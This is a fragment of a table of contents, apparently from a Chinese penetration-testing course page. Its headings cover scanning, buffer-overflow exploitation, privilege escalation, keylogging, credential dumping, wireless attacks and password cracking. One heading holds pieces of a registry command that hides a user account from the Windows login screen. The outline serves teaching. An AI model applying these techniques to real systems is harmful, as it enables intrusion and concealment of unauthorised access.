class="toc-text">发现弱点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%B4%E5%BA%A6%E5%AE%9A%E4%B9%89%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86"><span class="toc-number">14.0.0.2.</span> <span class="toc-text">从信息的维度定义漏洞管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B"><span class="toc-number">14.0.0.3.</span> <span class="toc-text">弱点扫描类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">14.0.0.4.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-1"><span class="toc-number">14.0.0.5.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-2"><span class="toc-number">14.0.0.6.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-3"><span class="toc-number">14.0.0.7.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-4"><span class="toc-number">14.0.0.8.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-5"><span class="toc-number">14.0.0.9.</span> <span class="toc-text">漏洞基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%BA%A7%E7%94%9F%E4%BA%86%E6%B7%B1%E8%BF%9C%E7%9A%84%E5%BD%B1%E5%93%8D%E3%80%82"><span class="toc-number">14.0.0.9.1.</span> <span class="toc-text">全行业产生了深远的影响。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-6"><span class="toc-number">14.0.0.10.</span> <span class="toc-text">漏洞基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86"><span class="toc-number">14.0.0.11.</span> <span class="toc-text">漏洞管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NMAP"><span class="toc-number">14.0.0.12.</span> <span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NMAP-1"><span class="toc-number">14.0.0.13.</span> <span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E7%A1%AE%E8%AE%A4"><span class="toc-number">14.0.0.14.</span> <span class="toc-text">扫描结果确认</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS"><span class="toc-number">14.0.0.15.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-1"><span class="toc-number">14.0.0.16.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-2"><span class="toc-number">14.0.0.17.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-3"><span class="toc-number">14.0.0.18.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-4"><span class="toc-number">14.0.0.19.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-5"><span class="toc-number">14.0.0.20.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-6"><span class="toc-number">14.0.0.21.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-7"><span class="toc-number">14.0.0.22.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-8"><span class="toc-number">14.0.0.23.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OPENVAS-9"><span class="toc-number">14.0.0.24.</span> <span class="toc-text">OPENVAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NESSUS"><span class="toc-number">14.0.0.25.</span> <span class="toc-text">NESSUS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NESSUS-1"><span class="toc-number">14.0.0.26.</span> <span class="toc-text">NESSUS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NESSUS-2"><span class="toc-number">14.0.0.27.</span> <span class="toc-text">NESSUS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NEXPOSE"><span class="toc-number">14.0.0.28.</span> <span class="toc-text">NEXPOSE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90"><span class="toc-number">14.0.0.29.</span> <span class="toc-text">扫描结果分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-5"><span class="toc-number">15.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">16.</span> <span class="toc-text">第九章 缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">16.0.0.1.</span> <span class="toc-text">程序漏洞从哪里来</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E7%BD%AA%E6%81%B6%E7%9A%84%E6%A0%B9%E6%BA%90%EF%BC%9A%E5%8F%98%E9%87%8F"><span class="toc-number">16.0.0.1.0.1.</span> <span class="toc-text">• 罪恶的根源：变量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%95%B0%E6%8D%AE%E4%B8%8E%E4%BB%A3%E7%A0%81%E8%BE%B9%E7%95%8C%E4%B8%8D%E6%B8%85"><span class="toc-number">16.0.0.1.0.2.</span> <span class="toc-text">• 数据与代码边界不清</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">16.0.0.2.</span> <span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E5%BD%93%E7%BC%93%E5%86%B2%E5%8C%BA%E8%BE%B9%E7%95%8C%E9%99%90%E5%88%B6%E4%B8%8D%E4%B8%A5%E6%A0%BC%E6%97%B6%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%98%E9%87%8F%E4%BC%A0%E5%85%A5%E7%95%B8%E5%BD%A2%E6%95%B0%E6%8D%AE%E6%88%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E9%94%99%E8%AF%AF%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E8%A2%AB%E2%80%9C%E6%92%91"><span class="toc-number">16.0.0.2.0.1.</span> <span class="toc-text">• 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9A%B4%E2%80%9D%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%A6%86%E7%9B%96%E4%BA%86%E7%9B%B8%E9%82%BB%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%9B"><span class="toc-number">16.0.0.2.0.2.</span> <span class="toc-text">暴”，从而覆盖了相邻内存区域的数据；</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%88%90%E5%8A%9F%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%8F%AF%E9%80%A0%E6%88%90%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A7%E5%88%B6%E6%9D%83%E7%AD%89%E5%90%8E%E6%9E%9C"><span class="toc-number">16.0.0.2.0.3.</span> <span class="toc-text">• 成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.0.0.3.</span> <span class="toc-text">如何发现漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">16.0.0.3.0.1.</span> <span class="toc-text">• 源码审计</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-number">16.0.0.3.0.2.</span> <span class="toc-text">• 逆向工程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">16.0.0.3.0.3.</span> <span class="toc-text">• 模糊测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WINDOWS-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">16.0.0.4.</span> <span class="toc-text">WINDOWS 缓冲区溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZER"><span class="toc-number">16.0.0.5.</span> <span class="toc-text">FUZZER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZER-1"><span class="toc-number">16.0.0.6.</span> <span class="toc-text">FUZZER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POP"><span class="toc-number">16.0.0.7.</span> <span class="toc-text">POP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING"><span class="toc-number">16.0.0.8.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%B5%8B%E8%AF%95-PASS-%E5%91%BD%E4%BB%A4%E6%8E%A5%E6%94%B6%E5%88%B0%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE%E6%97%B6%E6%98%AF%E5%90%A6%E4%BC%9A%E6%BA%A2%E5%87%BA"><span class="toc-number">16.0.0.8.0.1.</span> <span class="toc-text">• 测试 PASS 命令接收到大量数据时是否会溢出</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-EIP-%E5%AF%84%E5%AD%98%E5%99%A8%E5%AD%98%E6%94%BE%E4%B8%8B%E4%B8%80%E6%9D%A1%E6%8C%87%E4%BB%A4%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">16.0.0.8.0.2.</span> <span class="toc-text">• EIP 寄存器存放下一条指令的地址</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-1"><span class="toc-number">16.0.0.9.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-2700-%E4%B8%AA%E5%AD%97%E7%AC%A6%E5%AE%9E%E7%8E%B0-EIP-%E5%AF%84%E5%AD%98%E5%99%A8%E6%BA%A2%E5%87%BA"><span class="toc-number">16.0.0.9.0.1.</span> <span class="toc-text">• 2700 个字符实现 EIP 寄存器溢出</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-2"><span class="toc-number">16.0.0.10.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">16.0.0.10.0.1.</span> <span class="toc-text">• 思路：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-3"><span class="toc-number">16.0.0.11.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%A8%8B%E5%BA%8F%E3%80%81%E5%8D%8F%E8%AE%AE%E3%80%81%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BC%9A%E5%B0%86%E6%9F%90%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%AE%A4%E4%B8%BA%E6%98%AF%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%AD%97%E7%AC%A6%E6%9C%89%E5%9B%BA%E5%AE%9A%E7%94%A8%E9%80%94"><span class="toc-number">16.0.0.11.0.1.</span> <span class="toc-text">• 不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-4"><span class="toc-number">16.0.0.12.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E9%87%8D%E5%AE%9A%E5%90%91%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="toc-number">16.0.0.12.0.1.</span> <span class="toc-text">• 重定向数据流</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-5"><span class="toc-number">16.0.0.13.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%A2-%E5%AF%BB%E6%89%BE%E4%B8%8D%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97"><span class="toc-number">16.0.0.13.0.1.</span> <span class="toc-text">• 寻找不受保护的系统模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-6"><span class="toc-number">16.0.0.14.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-7"><span class="toc-number">16.0.0.15.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-8"><span class="toc-number">16.0.0.16.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LINUX-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">16.0.0.17.</span> <span class="toc-text">LINUX 缓冲区溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-9"><span class="toc-number">16.0.0.18.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-10"><span class="toc-number">16.0.0.19.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-11"><span class="toc-number">16.0.0.20.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-12"><span class="toc-number">16.0.0.21.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-13"><span class="toc-number">16.0.0.22.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-14"><span class="toc-number">16.0.0.23.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-15"><span class="toc-number">16.0.0.24.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-16"><span class="toc-number">16.0.0.25.</span> <span class="toc-text">FUZZING</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FUZZING-17"><span class="toc-number">16.0.0.26.</span> <span class="toc-text">FUZZING</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%9C-x00-x0a-x0d-x20%E2%80%9D"><span class="toc-number">16.0.0.26.1.</span> <span class="toc-text">“\x00\x0a\x0d\x20”</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%92%8C%E4%BF%AE%E6%94%B9-EXP"><span class="toc-number">16.0.0.27.</span> <span class="toc-text">选择和修改 EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%92%8C%E4%BF%AE%E6%94%B9-EXP-1"><span class="toc-number">16.0.0.28.</span> <span class="toc-text">选择和修改 EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%92%8C%E4%BF%AE%E6%94%B9-EXP-2"><span class="toc-number">16.0.0.29.</span> <span class="toc-text">选择和修改 EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wine32"><span class="toc-number">16.0.0.29.1.</span> <span class="toc-text">wine32</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%BF%E5%85%8D%E6%9C%89%E5%AE%B3%E7%9A%84-EXP"><span class="toc-number">16.0.0.30.</span> <span class="toc-text">避免有害的 EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5"><span class="toc-number">16.0.0.31.</span> <span class="toc-text">后漏洞利用阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST-EXPLOITATION"><span class="toc-number">16.0.0.32.</span> <span class="toc-text">POST EXPLOITATION</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%90%8E%E9%98%B6%E6%AE%B5"><span class="toc-number">16.0.0.33.</span> <span class="toc-text">漏洞利用后阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%90%8E%E9%98%B6%E6%AE%B5-1"><span class="toc-number">16.0.0.34.</span> <span class="toc-text">漏洞利用后阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%90%8E%E9%98%B6%E6%AE%B5-2"><span class="toc-number">16.0.0.35.</span> <span class="toc-text">漏洞利用后阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-number">16.0.0.36.</span> <span class="toc-text">传输文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-6"><span class="toc-number">17.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%8F%90%E6%9D%83"><span class="toc-number">18.</span> <span class="toc-text">第十章 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">18.0.0.1.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83-1"><span class="toc-number">18.0.0.2.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83-2"><span class="toc-number">18.0.0.3.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ADMIN-%E6%8F%90%E6%9D%83%E4%B8%BA-SYSTEM"><span class="toc-number">18.0.0.4.</span> <span class="toc-text">ADMIN 提权为 SYSTEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%83"><span class="toc-number">18.0.0.5.</span> <span class="toc-text">注入进程提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2"><span class="toc-number">18.0.0.6.</span> <span class="toc-text">抓包嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">18.0.0.7.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98%E5%AF%86%E7%A0%81"><span class="toc-number">18.0.0.8.</span> <span class="toc-text">本地缓存密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E5%BF%83%E4%BA%86%EF%BC%81"><span class="toc-number">18.0.0.8.1.</span> <span class="toc-text">小心了！</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WINDOWS-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">18.0.0.9.</span> <span class="toc-text">WINDOWS 身份认证过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WCE-WINDOWS-CREDENTIAL-EDITOR"><span class="toc-number">18.0.0.10.</span> <span class="toc-text">WCE (WINDOWS CREDENTIAL EDITOR)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1"><span class="toc-number">18.0.0.11.</span> <span class="toc-text">WCE (WINDOWS CREDENTIAL EDITOR)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">18.0.0.12.</span> <span class="toc-text">其他工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">18.0.0.13.</span> <span class="toc-text">利用漏洞提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83-1"><span class="toc-number">18.0.0.14.</span> <span class="toc-text">利用漏洞提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83-2"><span class="toc-number">18.0.0.15.</span> <span class="toc-text">利用漏洞提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83"><span class="toc-number">18.0.0.16.</span> <span class="toc-text">利用配置不当提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83-1"><span class="toc-number">18.0.0.17.</span> <span class="toc-text">利用配置不当提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83-2"><span class="toc-number">18.0.0.18.</span> <span class="toc-text">利用配置不当提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">18.0.0.19.</span> <span class="toc-text">基本信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">18.0.0.20.</span> <span class="toc-text">基本信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><span class="toc-number">18.0.0.21.</span> <span class="toc-text">WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="toc-number">18.0.0.22.</span> <span class="toc-text">收集敏感数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE-1"><span class="toc-number">18.0.0.23.</span> <span class="toc-text">收集敏感数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9"><span class="toc-number">18.0.0.24.</span> <span class="toc-text">隐藏痕迹</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#NT-CurrentVersion-WinLogon-SpecialAccounts-UserList%E2%80%9D-x2F-v-uname-x2F-T"><span class="toc-number">18.0.0.24.0.1.</span> <span class="toc-text">NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” &#x2F;v uname &#x2F;T</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#REG-DWORD-x2F-D-0"><span class="toc-number">18.0.0.24.0.2.</span> <span class="toc-text">REG_DWORD &#x2F;D 0</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-7"><span class="toc-number">19.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F"><span class="toc-number">20.</span> <span class="toc-text">第十一章 无线渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F"><span class="toc-number">20.0.1.</span> <span class="toc-text">无线渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%89%B9%E7%82%B9"><span class="toc-number">20.0.2.</span> <span class="toc-text">无线技术特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#802-11%E6%A0%87%E5%87%86%E6%97%A0%E7%BA%BF"><span class="toc-number">20.0.3.</span> <span class="toc-text">802.11标准无线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">20.0.4.</span> <span class="toc-text">无线运行模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D"><span class="toc-number">20.0.5.</span> <span class="toc-text">无线渗透实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#aircrack-ng%E5%9F%BA%E7%A1%80"><span class="toc-number">20.0.5.1.</span> <span class="toc-text">aircrack-ng基础</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-web%E6%B8%97%E9%80%8F"><span class="toc-number">21.</span> <span class="toc-text">第十二章 web渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.</span> <span class="toc-text">第十三章 密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">22.1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%96%BD%E4%BA%86%E5%BC%BA%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD"><span 